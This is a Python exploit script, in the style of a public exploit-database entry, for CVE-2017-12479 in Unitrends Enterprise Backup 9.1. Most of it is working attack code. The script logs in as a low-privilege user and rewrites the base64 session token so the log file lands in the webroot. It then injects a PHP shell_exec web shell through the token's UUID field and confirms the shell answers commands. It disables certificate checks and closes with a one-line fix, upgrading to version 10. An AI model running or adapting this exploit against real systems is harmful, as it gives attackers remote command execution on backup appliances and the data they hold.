# Exploit Title: Authenticated lowpriv RCE for Unitrends UEB 9.1
# Date: 08/08/2017
# Exploit Authors: Benny Husted, Jared Arave, Cale Smith
# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
# Vendor Homepage: https://www.unitrends.com/
# Software Link: https://www.unitrends.com/download/enterprise-backup-software
# Version: 9.1
# Tested on: CentOS6
# CVE: CVE-2017-12479

import httplib
import urllib
import ssl
import sys
import base64
import random
import time
import string
import json
from optparse import OptionParser

# Print some helpful words:
print """
###############################################################################
Authenticated lowpriv RCE for Unitrends UEB 9.1
Tested against appliance versions:
  [+] 9.1.0-2.201611302120.CentOS6

This exploit utilizes some issues in UEB9 session handling to place a 
php exec one liner in the webroot of the appliance.

Session tokens looks like this:

djA6NmM0ZWMzYTEtZmYwYi00MTIxLTk3YzYtMjQzODljM2EyNjY1OjE6L3Vzci9icC9sb2dzLmRpci9ndWlfcm9vdC5sb2c6MA==

and decodes to this:
                                                            LOG_LVL ----,
   v --- UUID ----------------------- v   v -- LOG_DIR -----------v     v
v0:6c4ec3a1-ff0b-4121-97c6-24389c3a2665:1:/usr/bp/logs.dir/gui_root.log:0 

The general steps that are followed by this poc are:

1. Authenticate as a low priv user and receive an auth token.
2. Modify the LOG_DIR field to point to a directory in the web root
   with apache user write access, and make a request to an arbitrary resource.
   This should touch a new file at the desired location.
3. Replace the UUID token in this auth token with a php shell_exec on liner, 
   and modify the LOG_LVL parameter to a value of 5, which will ensure
   that the UUID is reflected into the log file.
4. Issue a final request, to generate a shell.php file with a single shell_exec.
   This step is not strictly necessary.
###############################################################################
"""

# Disable SSL Cert validation
if hasattr(ssl, '_create_unverified_context'):
            ssl._create_default_https_context = ssl._create_unverified_context

# Parse command line args:
usage = "Usage: %prog -r <appliance_ip> -u <username> -p <password>\n"\

parser = OptionParser(usage=usage)
parser.add_option("-r", '--RHOST', dest='rhost', action="store",
          help="Target host w/ UNITRENDS UEB installation")
parser.add_option("-u", '--username', dest='username', action="store",
          help="User with any amount of privilege on unitrends device")
parser.add_option("-p", '--password', dest='password', action="store",
          help="password for this user")

(options, args) = parser.parse_args()

if not options.rhost:
  parser.error("[!] No remote host specified.\n")

elif options.rhost is None or options.username is None or options.password is None:
  parser.print_help()
  sys.exit(1)

RHOST = options.rhost
username = options.username
password = options.password

################################################################
# REQUEST ONE: GET A UUID.
################################################################

url1 = '/api/login'

a = {"username" : username,
     "password" : password}

post_body = json.dumps(a)

headers1 = {'Host' : RHOST}

print "[+] Attempting to log in to {0}, {1}:{2}".format(RHOST, username, password)

conn = httplib.HTTPSConnection(RHOST, 443)
conn.set_debuglevel(0)
conn.request("POST", url1, post_body, headers=headers1)
r1 = conn.getresponse()

################################################################
# BUILD THE AUTH TOKENS THAT WE'LL USE IN AN ATTACK.
################################################################

parsed_json = json.loads(r1.read())

if 'auth_token' not in parsed_json:
  print "[!] Didn't receive an auth token. Bad creds?"
  exit()

auth_encoded = parsed_json['auth_token']
auth_decoded = base64.b64decode(auth_encoded)

uuid = auth_decoded.split(':')[1]
ssid = auth_decoded.split(':')[2]

# We'll place our command shell in /var/www/html/tempPDF, since apache
# has rw in this dir.

log_dir = "/var/www/html/tempPDF/"
log_file = ''.join(random.choice(string.ascii_lowercase) for _ in range(5)) + '.php'
log_lvl = "5"
shell = "<?php echo shell_exec($_GET['cmd']);?> >"

auth_mod1 = "v0:{0}:{1}:{2}{3}:{4}".format(uuid, ssid, log_dir, log_file, log_lvl)
auth_mod2 = "v0:{0}:{1}:{2}{3}:{4}".format(shell, ssid, log_dir, log_file, log_lvl)

auth_mod1 = base64.b64encode(auth_mod1)
auth_mod2 = base64.b64encode(auth_mod2)

url2 = '/api/summary/current/'

################################################################
# REQUEST 2: PUT A FILE
################################################################

print "[+] Making a request to place log to http://{0}/tempPDF/{1}".format(RHOST, log_file)

headers2 = {'Host' : RHOST,
      'AuthToken' : auth_mod1}

# touch the file
conn.request("GET", url2, headers=headers2)
r2 = conn.getresponse()

print "[+] Making request to reflect shell_exec php to {0}.".format(log_file)

headers3 = {'Host' : RHOST,
      'AuthToken' : auth_mod2}

# make the first command
time.sleep(.5)
conn.request("GET", url2, headers=headers3)
conn.close()

# optional cleanup time

print "[+] Making a request to generate clean shell_exec at http://{0}/tempPDF/shell.php".format(RHOST)

url4 = '/tempPDF/' + log_file
url4 += '?cmd=echo+-e+"<?php%20echo%20shell_exec(\$_GET[%27cmd%27]);?>"+>+shell.php'

conn1 = httplib.HTTPSConnection(RHOST, 443)
conn1.request("GET", url4, headers=headers2)
r3 = conn1.getresponse()
conn1.close()


url5 = "/tempPDF/shell.php"
print "[+] Checking for presence of http://{0}{1}".format(RHOST, url5)
headers3 = {'Host' : RHOST}

conn2 = httplib.HTTPSConnection(RHOST, 443)
conn2.request("GET", url5, headers=headers2)
r3 = conn2.getresponse()

if r3.status == 200:
  print "[+] Got a 200 back. We did it."
  print "[+] Example cmd: http://{0}{1}?cmd=id".format(RHOST, url5)
else:
  print "Got a {0} back. Maybe this didn't work.".format(r3.status)
  print "Try RCE here http://{0}/tempPDF/{1}?cmd=id".format(RHOST, log_file)

conn2.close()

# 3. Solution:
# Update to Unitrends UEB 10